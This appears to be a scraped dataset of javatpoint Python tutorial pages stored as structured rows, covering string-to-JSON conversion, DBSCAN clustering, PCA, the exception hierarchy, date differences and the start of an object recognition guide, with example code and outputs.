is  {""subj1"":""Computer Science"",""subj2"":""Physics"",""subj3"":""Chemistry"",""subj4"":""Mathematics""}', ""The resultant dictionary is  {'subj1': 'Computer Science', 'subj2': 'Physics', 'subj3': 'Chemistry', 'subj4': 'Mathematics'}"", 'String_1 is  subj1 - 10 , subj2 - 20, subj3 - 25, subj4 - 14', ""The resultant dictionary is:  {'subj1': 10, 'subj2': 20, 'subj3': 25, 'subj4': 14}"", ""<class 'dict'>""]",[],"[""|||Using loads()|||Using literal_eval()|||Using Generator Expressions||||||In the first step, we have imported the json module.|||After this, we have initialized the string that we would like to convert.|||Now we have simply passed 'string_1' as a parameter in loads().|||Finally, in the last step, we have displayed the resultant dictionary.||||||In the first step, we have imported the ast module.|||After this, we have initialized the string that we would like to convert.|||Now we have simply passed 'string_1' as a parameter in literal_eval().|||Finally, in the last step, we have displayed the resultant dictionary.||||||In the first step, we have declared a string that has values paired with a hyphen, and each pair is separated with a comma. This information is important since it will act as a great tool in obtaining the desired output.|||Further, we have used strip() and split() in the for loop so that we get the dictionary in the usual format.|||Finally, we have printed the dictionary we created and verified its type using type().|||""]"
314,['Convert string to JSON in Python'],"['Before taking a deep dive into the topic, let us have a glance on what strings are and what is JSON?']","['https://www.javatpoint.com/dbscan-algorithm-in-python', 'https://www.javatpoint.com/convert-string-to-dictionary-in-python', 'https://www.javatpoint.com/dbscan-algorithm-in-python', 'https://www.javatpoint.com/convert-string-to-dictionary-in-python', 'https://www.javatpoint.com/dbscan-algorithm-in-python']",[],[],"['Using eval()', 'Fetching values', 'Conclusion']",[],[],"[""Strings: are a sequence of characters that are denoted using inverted commas ''. They are immutable which means they cannot be changed once declared."", 'The extension of JSON files is "".json""', 'Let us have a look at the first approach of converting a string to json in Python.', 'The following program illustrates the same.', 'Explanation:', ""It's time to see the explanation so that our logic becomes clear-"", 'Explanation:', 'Let us understand what we have done in the above program.', 'Finally, in the last program we will fetch the values after the conversion of string to json.', ""Let's have a look at it."", 'We can observe the following things in the output-', 'In this Tutorial, we learned how to convert a string to json using Python.']","['JSON: stands for ""JavaScript Object Notation"", the JSON files consist of text that can be easily read by humans and is present in the form of attribute-value pairs.']",[],"['# converting string to json', 'import json', '# initialize the json object', ""i_string = {'C_code': 1, 'C++_code' : 26,"", ""'Java_code' : 17, 'Python_code' : 28}"", '# printing initial json', 'i_string = json.dumps(i_string)', 'print (""The declared dictionary is "", i_string)', 'print (""It\'s type is "", type(i_string))', '# converting string to json', 'res_dictionary = json.loads(i_string)', '# printing the final result', 'print (""The resultant dictionary is "", str(res_dictionary))', 'print (""The type of resultant dictionary is"", type(res_dictionary))', '# converting string to json', 'import json', '# initialize the json object', 'i_string = """""" {\'C_code\': 1, \'C++_code\' : 26,', ""'Java_code' : 17, 'Python_code' : 28}"", '# printing initial json', 'print (""The declared dictionary is "", i_string)', 'print (""Its type is "", type(i_string))', '# converting string to json', 'res_dictionary = eval(i_string)', '# printing the final result', 'print (""The resultant dictionary is "", str(res_dictionary))', 'print (""The type of resultant dictionary is "", type(res_dictionary))', 'import json', 'i_dict = \'{""C_code"": 1, ""C++_code"" : 26, ""Java_code"":17, ""Python_code"":28}\'', 'res = json.loads(i_dict)', 'print(res[""C_code""])', 'print(res[""Java_code""])']","[""The declared dictionary is {'C_code': 1, 'C++_code' : 26,"", ""'Java_code' : 17, 'Python_code' : 28}"", ""It's type is <class 'str'>"", ""The resultant dictionary is {'C_code': 1, 'C++_code' : 26,"", ""'Java_code' : 17, 'Python_code' : 28}"", ""The type of resultant dictionary is <class 'dict'>"", ""The declared dictionary is   {'C_code': 1, 'C++_code' : 26,"", ""'Java_code' : 17, 'Python_code' : 28}"", ""Its type is  <class 'str'>"", ""The resultant dictionary is  {'C_code': 1, 'C++_code': 26, 'Java_code': 17, 'Python_code': 28}"", ""The type of resultant dictionary is  <class 'dict'>"", '1', '17']",[],"['|||Since here the objective is to convert a string to json file we will first import the json module.|||The next step is to initialize the json object in which we have the subject name as keys and then their corresponding values are specified.|||After this, we have used dumps() to convert a Python object to a json string.|||Finally, we will use loads() to parse a JSON string and convert it into a dictionary.||||||Since here the objective is to convert a string to json file we will first import the json module.|||The next step is to initialize the json object in which we have the subject name as keys and then their corresponding values are specified.|||After this, we have used eval() to convert a Python string to json.|||On executing the program, it displays the desired output.||||||We have converted the string to json using json.loads().|||After this we have used the keys ""C_code"" & ""Java_code"" to fetch their corresponding values.|||']"
315,['DBSCAN algorithm in Python'],"['In this tutorial, we will learn how we can implement and use the DBSCAN algorithm in Python.']","['https://www.javatpoint.com/how-to-write-a-code-for-printing-python-exception-errorhierarchy', 'https://www.javatpoint.com/convert-string-to-json-in-python', 'https://www.javatpoint.com/how-to-write-a-code-for-printing-python-exception-errorhierarchy', 'https://www.javatpoint.com/convert-string-to-json-in-python', 'https://www.javatpoint.com/how-to-write-a-code-for-printing-python-exception-errorhierarchy']","['https://static.javatpoint.com/python/images/dbscan-algorithm-in-python.png', 'https://static.javatpoint.com/python/images/dbscan-algorithm-in-python2.png', 'https://static.javatpoint.com/python/images/dbscan-algorithm-in-python3.png', 'https://static.javatpoint.com/python/images/dbscan-algorithm-in-python4.png', 'https://static.javatpoint.com/python/images/dbscan-algorithm-in-python5.png', 'https://static.javatpoint.com/python/images/dbscan-algorithm-in-python6.png']",[],['Implementation of DBSCAN algorithm in Python'],"['Prerequisites for implementation of DBSCAN algorithm:', 'Implementation steps for the DBSCAN algorithm:']",[],"['We have to fulfil the following prerequisites before we proceed with the implementation part of the DBSCAN algorithm in this section:', 'When we press the enter key, the numpy library is started installing in our system.', 'Step 1: Importing all the required libraries:', 'Here, we have firstly imported all the required libraries or modules of libraries inside the program:', 'Step 2: Loading the Data:', 'The data as given in the output above will be printed when we run the program, and we will work on this data from the dataset file we loaded.', 'Step 3: Preprocessing the data:', 'Step 4: Reduce the dimensionality of the data:', 'Step 5: Build a clustering model:', 'Step 6: Visualize the clustering model:', 'Step 7: Tuning the parameters:', 'Step 8: Visualization of the changes:']","['After some time, we will see that the numpy library is successfully installed in our system (Here, we already have the numpy library present in our system).', '5. Last but not least, we should also be aware of the DBSCAN algorithm (what it is and how it works), as we have discussed already, so that we can easily understand the implementation of it in Python.', ""Before we move forward, we should make sure that we have fulfilled all the prerequisites that we have listed down above so that we don't have to face any problems while following the implementation steps."", 'First and foremost, we have to import all the required libraries which we have installed in the prerequisites part so that we can use their functions while implementing the DBSCAN algorithm.', 'Now, we will start preprocessing the data of the dataset in this step by using the functions of preprocessing module of the Sklearn library. We have to use the following technique while preprocessing the data with Sklearn library functions:', 'Now, this is the most important step of the implementation as here we have to build a clustering model of the data (on which we are performing operations), and we can do this by using the DBSCAN function of the Sklearn library as we have used below:', 'As we can see in the output, we have plotted the graph using the data points of the dataset and visualized the clustering by labelling the data points with different colours.', 'In this step, we will be tuning the parameters of the module by changing the parameters that we have previously given in the DBSCAN function as follow:', 'Now, after tuning the parameters of the cluster model we created, we will visualize the changes that will come in the cluster by labelling the data points in the dataset with different colours as we have done before.']","[""In 1996, DBSCAN or Density-Based Spatial Clustering of Applications with Noise, a clustering algorithm, was first proposed, and it was awarded the 'Test of Time' award in the year 2014. The 'Test of Time' award was given to DBSCAN at Data Mining Conference, KDD. We will not learn about the DBSCAN algorithm here and only discuss the implementation of the DBSCAN algorithm in Python. But if we have to understand the implementation of the DBSCAN algorithm, we should have at least a basic idea about it. Therefore, if it is advisable that if you don't know what the DBSCAN algorithm is or how it works, then you should first learn about the DBSCAN algorithm and its working."", 'We will perform the implementation operation of the DBSCAN algorithm in this section, and we will do this in steps so that it will be easy to understand and learn. We are going to use a dataset in this implementation process to perform various operations (including those we do in the DBSCAN algorithm) on it. Before we start the implementation process, we should fulfil the prerequisites to implement the DBSCAN algorithm inside a Python program.', ""1. Numpy library: We should make sure that the numpy library is installed in our system and that too of the latest version as we are going to use functions on the numpy library on the dataset we will use in the implementation process. If numpy library is not present in our system or we haven't installed it before, then we can use the following command in the command prompt terminal present in our device to install it:"", '2. Panda library: Like numpy library, panda library is also the required library that should be present in our system, and if it is not present in our system, we can use the following command in the command prompt terminal to install it with pip installer:', '3. matplotlib library: It is also an important library in the implementation process of the DBSCAN algorithm as functions of this library will help us display results from the dataset. If the matplotlib library is not present in our system, then we can use the following command in the command prompt terminal present to install it with pip installer:', '4. Sklearn library: Sklearn library is going to be one of the major requirements while performing the implementation operation of the DBSCAN algorithm as we have to import various modules from the Sklearn library itself in the program, such as preprocessing decomposing etc. Therefore, we should make sure that the Sklearn library is present in our system or not, and if it is not present in our system, then we can use the following command in the command prompt terminal present to install it with pip installer:', 'Now, we will perform the implementation of the DBSCAN algorithm in Python. Still, we will do this in steps as we have mentioned earlier so that the implementation part does not get any complex, and we can understand it very easily. We have to follow the following steps in order to implement the DBSCAN algorithm and its logic inside a Python program:', ""In this step, we have to load that data, and we can do this by importing or loading the dataset (that is required in the DBSCAN algorithm to work on it) inside the program. To load the dataset inside the program, we will use the read.csv() function of the panda's library and print the information from the dataset as we have done below:"", 'In this step, we will be reducing the dimensionality of the scaled and normalized data so that the data can be visualized easily inside the program. We have to use the PCA function in the following way in order to transform the data and reduce its dimensionality:', 'As we can see in the output, we have transformed the normalized data into two components which is the two columns (we can see them in the output), using the PCA. And, after that, we made dataframes from transformed data using the panda library dataframe() function.', 'We can clearly observe the changes that have come in the cluster scattering of data points by tuning the parameters of the DBSCAN function by looking at the output. As we will observe the changes, we can also understand how the DBSCAN algorithm works and how it is helpful in the Visualization of cluster scattering of data points present in a dataset.']","['pip install numpy', 'pip install pandas', 'pip install matplotlib', 'pip install matplotlib', '# Importing numpy library as nmp', 'import numpy as nmp', '# Importing pandas library as pds', 'import pandas as pds', '# Importing matplotlib library as pplt', 'import matplotlib.pyplot as pplt', '# Importing DBSCAN from cluster module of Sklearn library', 'from sklearn.cluster import DBSCAN', '# Importing StandardSclaer and normalize from preprocessing module of Sklearn library', 'from sklearn.preprocessing import StandardScaler', 'from sklearn.preprocessing import normalize', '# Importing PCA from decomposition module of Sklearn', 'from sklearn.decomposition import PCA', '# Loading the data inside an initialized variable', ""M = pds.read_csv('sampleDataset.csv') # Path of dataset file"", '# Dropping the CUST_ID column from the dataset with drop() function', ""M = M.drop('CUST_ID', axis = 1)"", '# Using fillna() function to handle missing values', ""M.fillna(method ='ffill', inplace = True)"", '# Printing dataset head in output', 'print(M.head())', '# Initializing a variable with the StandardSclaer() function', 'scalerFD = StandardScaler()', '# Transforming the data of dataset with Scaler', 'M_scaled = scalerFD.fit_transform(M)', '# To make sure that data will follow gaussian distribution', '# We will normalize the scaled data with normalize() function', 'M_normalized = normalize(M_scaled)', '# Now we will convert numpy arrays in the dataset into dataframes of panda', 'M_normalized = pds.DataFrame(M_normalized)', '# Initializing a variable with the PCA() function', 'pcaFD = PCA(n_components = 2) # components of data', '# Transforming the normalized data with PCA', 'M_principal = pcaFD.fit_transform(M_normalized)', '# Making dataframes from the transformed data', 'M_principal = pds.DataFrame(M_principal)', '# Creating two columns in the transformed data', ""M_principal.columns = ['C1', 'C2']"", '# Printing the head of the transformed data', 'print(M_principal.head())', '# Creating clustering model of the data using the DBSCAN function and providing parameters in it', 'db_default = DBSCAN(eps = 0.0375, min_samples = 3).fit(M_principal)', '# Labelling the clusters we have created in the dataset', 'labeling = db_default.labels_', '# Visualization of clustering model by giving different colours', 'colours = {}', '# First colour in visualization is green', ""colours[0] = 'g'"", '# Second colour in visualization is black', ""colours[1] = 'k'"", '# Third colour in visualization is red', ""colours[2] = 'r'"", '# Last colour in visualization is blue', ""colours[-1] = 'b'"", '# Creating a colour vector for each data point in the dataset cluster', 'cvec = [colours[label] for label in labeling]', '# Construction of the legend', '# Scattering of green colour', ""g = pplt.scatter(M_principal['C1'], M_principal['C2'], color ='g');"", '# Scattering of black colour', ""k = pplt.scatter(M_principal['C1'], M_principal['C2'], color ='k');"", '# Scattering of red colour', ""r = pplt.scatter(M_principal['C1'], M_principal['C2'], color ='r');"", '# Scattering of green colour', ""b = pplt.scatter(M_principal['C1'], M_principal['C2'], color ='b');"", '# Plotting C1 column on the X-Axis and C2 on the Y-Axis', '# Fitting the size of the figure with figure function', 'pplt.figure(figsize =(9, 9))', '# Scattering the data points in the Visualization graph', ""pplt.scatter(M_principal['C1'], M_principal['C2'], c = cvec)"", '# Building the legend with the coloured data points and labelled', ""pplt.legend((g, k, r, b), ('Label M.0', 'Label M.1', 'Label M.2', 'Label M.-1'))"", '# Showing Visualization in the output', 'pplt.show()', '# Tuning the parameters of the model inside the DBSCAN function', 'dts = DBSCAN(eps = 0.0375, min_samples = 50).fit(M_principal)', '# Labelling the clusters of data points', 'labeling = dts.labels_', '# Labelling with different colours', 'colours1 = {}', '# labelling with Red colour', ""colours1[0] = 'r'"", '# labelling with Green colour', ""colours1[1] = 'g'"", '# labelling with Blue colour', ""colours1[2] = 'b'"", ""colours1[3] = 'c'"", '# labelling with Yellow colour', ""colours1[4] = 'y'"", '# Magenta colour', ""colours1[5] = 'm'"", '# labelling with Black colour', ""colours1[-1] = 'k'"", '# Labelling the data points with the colour variable we have defined', 'cvec = [colours1[label] for label in labeling]', '# Defining all colour that we will use', ""colors = ['r', 'g', 'b', 'c', 'y', 'm', 'k' ]"", '# Scattering the colours onto the data points', 'r = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[0])"", 'g = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[1])"", 'b = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[2])"", 'c = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[3])"", 'y = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[4])"", 'm = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[5])"", 'k = pplt.scatter(', ""M_principal['C1'], M_principal['C2'], marker ='o', color = colors[6])"", '# Fitting the size of the figure with figure function', 'pplt.figure(figsize =(9, 9))', '# Scattering column 1 into X-axis and column 2 into y-axis', ""pplt.scatter(M_principal['C1'], M_principal['C2'], c = cvec)"", '# Constructing a legend with the colours we have defined', 'pplt.legend((r, g, b, c, y, m, k),', ""('Label M.0', 'Label M.1', 'Label M.2', 'Label M.3', 'Label M.4','Label M.5', 'Label M.-1'), # Using different labels for data points"", 'scatterpoints = 1, # Defining the scatter point', ""loc ='upper left', # Location of cluster scattering"", 'ncol = 3, # Number of columns', 'fontsize = 10) # Size of the font', '# Displaying the visualisation of changes in cluster scattering', 'pplt.show()']","['BALANCE  BALANCE_FREQUENCY  ...  PRC_FULL_PAYMENT  TENURE', '0    40.900749           0.818182  ...          0.000000      12', '1  3202.467416           0.909091  ...          0.222222      12', '2  2495.148862           1.000000  ...          0.000000      12', '3  1666.670542           0.636364  ...          0.000000      12', '4   817.714335           1.000000  ...          0.000000      12', '[5 rows x 17 columns]', 'C1        C2', '0 -0.489949 -0.679976', '1 -0.519099  0.544828', '2  0.330633  0.268877', '3 -0.481656 -0.097610', '4 -0.563512 -0.482506']",[],[]
316,['How to Write a Code for Printing the Python Exception/Error Hierarchy?'],"['In this tutorial, we will see how to write a code for printing the Python Error Hierarchy. But before starting first, we should learn what an Exception really is? Exceptions are the errors that can occur even if our code is syntactically correct. These are not unconditionally fatal, and the errors users get while executing the code are known as exceptions. There are numerous inbuilt Exceptions in Python, and here, we will try to print them out in a hierarchy.']","['https://www.javatpoint.com/principal-component-analysis-with-python', 'https://www.javatpoint.com/dbscan-algorithm-in-python', 'https://www.javatpoint.com/principal-component-analysis-with-python', 'https://www.javatpoint.com/dbscan-algorithm-in-python', 'https://www.javatpoint.com/principal-component-analysis-with-python']",[],[],['Conclusion'],[],[],"['To build a tree hierarchy, we can use inspect.getclasstree() function.', 'In this tutorial, we have discussed how to print the exception error in the hierarchy by using the inspect module of Python.']","['inspect.getclasstree(): is used for arranging the given list of classes into a hierarchy of the nested lists. Where the nested list appears, it will contain the classes derived from the class whose entry would immediately proceed the list.']","['To print the tree hierarchy, we can use inspect module of Python. The inspect module is used for getting information about objects like modules, classes methods, functions, and objects of the program. Such as, the users can use it for examining the contents of a class, extracting, and formatting the argument list for a function.']","['inspect.getclasstree(classes, unique = False)', '# For printing the hierarchy for inbuilt exceptions:', '# First, we will import the inspect module', 'import inspect as ipt', '# Then we will create tree_class function', 'def tree_class(cls, ind = 0):', '# Then we will print the name of the class', ""print ('-' * ind, cls.__name__)"", '# now, we will iterate through the subclasses', 'for K in cls.__subclasses__():', 'tree_class(K, ind + 3)', 'print (""The Hierarchy for inbuilt exceptions is: "")', '# THE inspect.getmro() will return the tuple', ""# of class  which is cls's base classes."", '#Now, we will build a tree hierarchy', 'ipt.getclasstree(ipt.getmro(BaseException))', '# function call', 'tree_class(BaseException)']","['The Hierarchy for inbuilt exceptions is:', 'BaseException', '---> Exception', '------> TypeError', '---------> MultipartConversionError', '---------> FloatOperation', '------> StopAsyncIteration', '------> StopIteration', '------> ImportError', '---------> ModuleNotFoundError', '---------> ZipImportError', '------> OSError', '---------> ConnectionError', '------------> BrokenPipeError', '------------> ConnectionAbortedError', '------------> ConnectionRefusedError', '------------> ConnectionResetError', '--------------> RemoteDisconnected', '---------> BlockingIOError', '---------> ChildProcessError', '---------> FileExistsError', '---------> FileNotFoundError', '---------> IsADirectoryError', '---------> NotADirectoryError', '---------> InterruptedError', '------------> InterruptedSystemCall', '---------> PermissionError', '---------> ProcessLookupError', '---------> TimeoutError', '---------> UnsupportedOperation', '---------> Error', '------------> SameFileError', '---------> SpecialFileError', '---------> ExecError', '---------> ReadError', '---------> herror', '---------> gaierror', '---------> timeout', '---------> SSLError', '------------> SSLCertVerificationError', '------------> SSLZeroReturnError', '------------> SSLWantReadError', '------------> SSLWantWriteError', '------------> SSLSyscallError', '------------> SSLEOFError', '---------> URLError', '------------> HTTPError', '------------> ContentTooShortError', '------> EOFError', '---------> IncompleteReadError', '------> RuntimeError', '---------> RecursionError', '---------> NotImplementedError', '------------> StdinNotImplementedError', '------------> ZMQVersionError', '---------> _DeadlockError', '---------> BrokenBarrierError', '---------> BrokenExecutor', '---------> SendfileNotAvailableError', '------> NameError', '---------> UnboundLocalError', '------> AttributeError', '---------> FrozenInstanceError', '------> SyntaxError', '---------> IndentationError', '------------> TabError', '------> LookupError', '---------> IndexError', '---------> KeyError', '------------> UnknownBackend', '------------> NoSuchKernel', '.', '.', '.', '.', '---> GeneratorExit', '---> SystemExit', '---> KeyboardInterrupt', '---> CancelledError']",[],[]
317,['Principal Component Analysis (PCA) with Python'],['Principal Component Analysis (PCA): is an algebraic technique for converting a set of observations of possibly correlated variables into the set of values of liner uncorrelated variables.'],"['https://www.javatpoint.com/python-program-to-find-number-of-days-between-two-given-dates', 'https://www.javatpoint.com/how-to-write-a-code-for-printing-python-exception-errorhierarchy', 'https://www.javatpoint.com/https://www.kaggle.com/sgus1318/winedata', 'https://www.javatpoint.com/python-program-to-find-number-of-days-between-two-given-dates', 'https://www.javatpoint.com/how-to-write-a-code-for-printing-python-exception-errorhierarchy', 'https://www.javatpoint.com/python-program-to-find-number-of-days-between-two-given-dates']","['https://static.javatpoint.com/python/images/principal-component-analysis-with-python.png', 'https://static.javatpoint.com/python/images/principal-component-analysis-with-python2.png']",[],"['Different Uses of Principal Component Analysis:', 'What are the Objectives of Principal Component Analysis?', 'Following are the Steps for Using PCA with Python:', 'Conclusion']",[],[],"['The basic objectives of PCA are as follows:', 'Now, we will Discuss Principal Component Analysis with Python.', 'In this tutorial, we will use wine.csv Dataset.', 'Step 1: We will import the libraries.', 'Step 2: We will import the dataset (wine.csv)', 'First, we will import the dataset and distribute it into X and Y components for data analysis.', 'Step 3: In this step, we will split the dataset into the training set and testing set.', 'Step 4: Now, we will Feature Scaling.', 'In this step, we will do the re-processing on the training and testing set, for example, fitting the standard scale.', 'Step 5: Then, Apply the PCA function', 'We will apply the PCA function into the training set and testing set for analysis.', 'Step 6: Now, we will fit Logistic Regression for the training set', 'Step 7: Here, we will predict the testing set result:', 'Step 8: We will create the confusion matrix.', 'Step 9: Then, predict the result of the training set.', 'Step 10: At last, we will visualize the result of the testing set.']","[""In this tutorial, we have learned about principal component analysis with Python, its uses, and objects and how to use it on the data set to analyse the data's testing and training sets.""]","['All principal components are chosen to describe most of the available variance in the variable, and all principal components are orthogonal to each other. In all the sets of the principal component first principal component will always have the maximum variance.', 'Principal component analysations are usually executed on a square symmetric matrix, and this can be a pure sum of squares and cross products matrix or correlation matrix or covariance matrix. The correlation matrix is used if there is a major difference in the individual variance.', 'Principal Axis Method: Principal Component Analysis searches for the linear combination of the variable for extracting maximum variance from the variables. Once the PCA is done with the process, it will move forward to another linear combination which will explain the maximum ratio of the remaining variance, which would lead to orthogonal factors of the sets. This method is used for analysing total variance in the variables of the set.', ""Eigen Vector: It is a nonzero vector that remains parallel after multiplying the matrix. Suppose 'V' is an eigen vector of dimension R of matrix K with dimension R * R. If KV and V are parallel. Then the user has to solve KV = PV where both V and P are unknown for solving eigen vector and eigen value."", 'Eigen Value: It is also known as ""characteristic roots"" in PCA. This is used for measuring the variance in all the variables of the set, which is reported for by that factor. The proportion of eigen value is the ratio of descriptive importance of the factors concerning the variables. If the factor is low, then it subsidises less to the description of variables.']","['import numpy as nmp', 'import matplotlib.pyplot as mpltl', 'import pandas as pnd', ""DS = pnd.read_csv('Wine.csv')"", '# Now, we will distribute the dataset into two components ""X"" and ""Y""', 'X = DS.iloc[: , 0:13].values', 'Y = DS.iloc[: , 13].values', 'from sklearn.model_selection import train_test_split as tts', 'X_train, X_test, Y_train, Y_test = tts(X, Y, test_size = 0.2, random_state = 0)', 'from sklearn.preprocessing import StandardScaler as SS', 'SC = SS()', 'X_train = SC.fit_transform(X_train)', 'X_test = SC.transform(X_test)', 'from sklearn.decomposition import PCA', 'PCa = PCA (n_components = 1)', 'X_train = PCa.fit_transform(X_train)', 'X_test = PCa.transform(X_test)', 'explained_variance = PCa.explained_variance_ratio_', 'from sklearn.linear_model import LogisticRegression as LR', 'classifier_1 = LR (random_state = 0)', 'classifier_1.fit(X_train, Y_train)', 'Y_pred = classifier_1.predict(X_test)', 'from sklearn.metrics import confusion_matrix as CM', 'c_m = CM (Y_test, Y_pred)', 'from matplotlib.colors import ListedColormap as LCM', 'X_set, Y_set = X_train, Y_train', 'X_1, X_2 = nmp.meshgrid(nmp.arange(start = X_set[:, 0].min() - 1,', 'stop = X_set[: , 0].max() + 1, step = 0.01),', 'nmp.arange(start = X_set[: , 1].min() - 1,', 'stop = X_set[: , 1].max() + 1, step = 0.01))', 'mpltl.contourf(X_1, X_2, classifier_1.predict(nmp.array([X_1.ravel(),', 'X_2.ravel()]).T).reshape(X_1.shape), alpha = 0.75,', ""cmap = LCM (('yellow', 'grey', 'green')))"", 'mpltl.xlim (X_1.min(), X_1.max())', 'mpltl.ylim (X_2.min(), X_2.max())', 'for s, t in enumerate(nmp.unique(Y_set)):', 'mpltl.scatter(X_set[Y_set == t, 0], X_set[Y_set == t, 1],', ""c = LCM (('red', 'green', 'blue'))(s), label = t)"", ""mpltl.title('Logistic Regression for Training set: ')"", ""mpltl.xlabel ('PC_1') # for X_label"", ""mpltl.ylabel ('PC_2') # for Y_label"", 'mpltl.legend() # for showing legend', '# show scatter plot', 'mpltl.show()', 'from matplotlib.colors import ListedColormap as LCM', 'X_set, Y_set = X_test, Y_test', 'X_1, X_2 = nmp.meshgrid(nmp.arange(start = X_set[: , 0].min() - 1,', 'stop = X_set[: , 0].max() + 1, step = 0.01),', 'nmp.arange(start = X_set[: , 1].min() - 1,', 'stop = X_set[: , 1].max() + 1, step = 0.01))', 'mpltl.contourf(X_1, X_2, classifier_1.predict(nmp.array([X_1.ravel(),', 'X_2.ravel()]).T).reshape(X_1.shape), alpha = 0.75,', ""cmap = LCM(('pink', 'grey', 'aquamarine')))"", 'mpltl.xlim(X_1.min(), X_1.max())', 'mpltl.ylim(X_2.min(), X_2.max())', 'for s, t in enumerate(nmp.unique(Y_set)):', 'mpltl.scatter(X_set[Y_set == t, 0], X_set[Y_set == t, 1],', ""c = LCM(('red', 'green', 'blue'))(s), label = t)"", '# title for scatter plot', ""mpltl.title('Logistic Regression for Testing set')"", ""mpltl.xlabel ('PC_1') # for X_label"", ""mpltl.ylabel ('PC_2') # for Y_label"", 'mpltl.legend()', '# show scatter plot', 'mpltl.show()']",['LogisticRegression(random_state=0)'],[],"['|||PCA can be used for finding interrelations between various variables in the data.|||PCA can be used for interpreting and visualizing the data sets.|||PCA can also be used for visualizing genetic distance and connection between populations.|||PCA also makes analysis simple with the decrease in the number of variables.||||||PCA is a nondependent method can be used for reducing attribute space from a larger number of variables of the set to a smaller number of factors.|||It is a dimension reducing technique but with no assurance whether the dimension would be interpretable.|||In PCA, the main job is selecting the subset of variables from a larger set, depending on which original variables will have the highest correlation with the principal amount.|||']"
318,['Python Program to Find Number of Days Between Two Given Dates'],"['In this tutorial, we will discuss how to write a Python program to find the number of days between two given numbers.']","['https://www.javatpoint.com/object-recognition-using-python', 'https://www.javatpoint.com/principal-component-analysis-with-python', 'https://www.javatpoint.com/object-recognition-using-python', 'https://www.javatpoint.com/principal-component-analysis-with-python', 'https://www.javatpoint.com/object-recognition-using-python']",[],[],"['Method 1: Naïve Approach', 'Method 2: By using Python datetime module', 'Conclusion']",[],[],"['Suppose we have given two dates our expected output would be:', 'In this tutorial, we have discussed two different methods of how to write a python code to find the total number of days between the two given dates.']",[],"['In this approach, the naïve solution will start from date_1, and it will keep counting the number of days until it reaches date_2. This solution will require more than O(1) times. It is a simple solution for counting the total number of days before date_1, which means it will count total days from 00/00/0000 to date_1, then it will count the total number of days before date_2. At last, it will return the difference between the two counts in the form of total days between the two given dates.', 'In this method, we will see how we can use a built_in function of Python ""datetime"", which can help the users in solving various date-time related problems. For finding the difference between two dates, we can input the two dates in a date type format and subtract them, and this will result in output as the number of days between the two given dates.']","['Input: Date_1 = 12/10/2021, Date_2 = 31/08/2022', 'Output: Number of Days between the given Dates are: 323 days', 'Input: Date_1 = 10/09/2023, Date_2 = 04/02/2025', 'Output: Number of Days between the given Dates are: 323 days: 513 days', '# First, we will create a class for dates', 'class date_n:', 'def __init__(self, day, month, year):', 'self.day = day', 'self.month = month', 'self.year = year', '# For storng number of days in all months from', '# January to December.', 'month_Days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]', '# This function will count the number of leap years from 00/00/0000 to the #given date', 'def count_Leap_Years(day):', 'years = day.year', '# Now, it will check if the current year should be considered for the count          # of leap years or not.', 'if (day.month <= 2):', 'years -= 1', '# The condition for an year is a leap year: if te year is a multiple of 4, and a            # multiple of 400 but not a multiple of 100.', 'return int(years / 4) - int(years / 100) + int(years / 400)', '# This function will return number of days between two given dates', 'def get_difference(date_1, date_2):', '# Now, it will count total number of days before first date ""date_1""', '# Then, it will initialize the count by using years and day', 'n_1 = date_1.year * 365 + date_1.day', '# then, it will add days for months in the given date', 'for K in range(0, date_1.month - 1):', 'n_1 += month_Days[K]', '# As every leap year is of 366 days, we will add', '# a day for every leap year', 'n_1 += count_Leap_Years(date_1)', '# SIMILARLY, it will count total number of days before second date ""date_2""', 'n_2 = date_2.year * 365 + date_2.day', 'for K in range(0, date_2.month - 1):', 'n_2 += month_Days[K]', 'n_2 += count_Leap_Years(date_2)', '# Then, it will return the difference between two counts', 'return (n_2 - n_1)', '# Driver program', 'date_1 = date_n(12, 10, 2021)', 'date_2 = date_n(30, 8, 2022)', 'print (""Number of Days between the given Dates are: "", get_difference(date_1, date_2), ""days"")', 'from datetime import date as date_n', 'def number_of_days(date_1, date_2):', 'return (date_2 - date_1).days', '# Driver program', 'date_1 = date_n(2023, 9, 10)', 'date_2 = date_n(2025, 2, 4)', 'print (""Number of Days between the given Dates are: "", number_of_days(date_1, date_2), ""days"")']","['Number of Days between the given Dates are:  322 days', 'Number of Days between the given Dates are:  513 days']",[],[]
319,['Object Recognition using Python'],"['Object Recognition is a technology that lies under the broader domain of Computer Vision. This technology is capable of identifying objects that exist in images and videos and tracking them. Object Recognition also known as Object Detection, has various applications like face recognition, vehicle recognition, pedestrian counting, self-driving vehicles, security systems, and a lot more.']","['https://www.javatpoint.com/python-vlc-module', 'https://www.javatpoint.com/python-program-to-find-number-of-days-between-two-given-dates', 'https://www.javatpoint.com/https://www.python.org/', 'https://www.javatpoint.com/https://github.com/OlafenwaMoses/ImageAI/releases/download/1.0/yolo-tiny.h5', 'https://www.javatpoint.com/python-vlc-module', 'https://www.javatpoint.com/python-program-to-find-number-of-days-between-two-given-dates', 'https://www.javatpoint.com/python-vlc-module']","['https://static.javatpoint.com/python/images/object-recognition-using-python.jpg', 'https://static.javatpoint.com/python/images/object-recognition-using-python2.jpg']",[],"['Deep Learning for Object Recognition', 'Understanding the ImageAI library', 'Setting up the Environment', 'Performing Object Recognition using ImageAI', 'Complete Python script for Object Recognition model']","['Step 1', 'Step 2', 'Step 3', 'Step 4', 'Step 5', 'Step 6', 'Step 7', 'Step 8', 'Step 9', 'Step 10']",[],"['The two significant objectives of object recognition involve:', ""So, let's get begun."", 'However, in this tutorial, we will understand what ImageAI is and how we can use it in performing Object Recognition.', 'In this section of the tutorial, we will consider working through the installation of required libraries, including ImageAI.', 'Once we have installed Python on the system successfully, we have to install the following dependencies with the help of the pip installer:', 'The installation command for the same is shown below:', 'Now we have to download the TinyYOLOv3 model file containing the classification method that we will use for object recognition.', 'The link for the same can be found below:', 'https://github.com/OlafenwaMoses/ImageAI/releases/download/1.0/yolo-tiny.h5', 'The initial step is to create the necessary folders. For this tutorial, we will need the folders as shown below:', 'Once we created the necessary folder, the Object Recognition folder should have the following sub-folders:', 'Now, let us begin importing ObjectDetection class 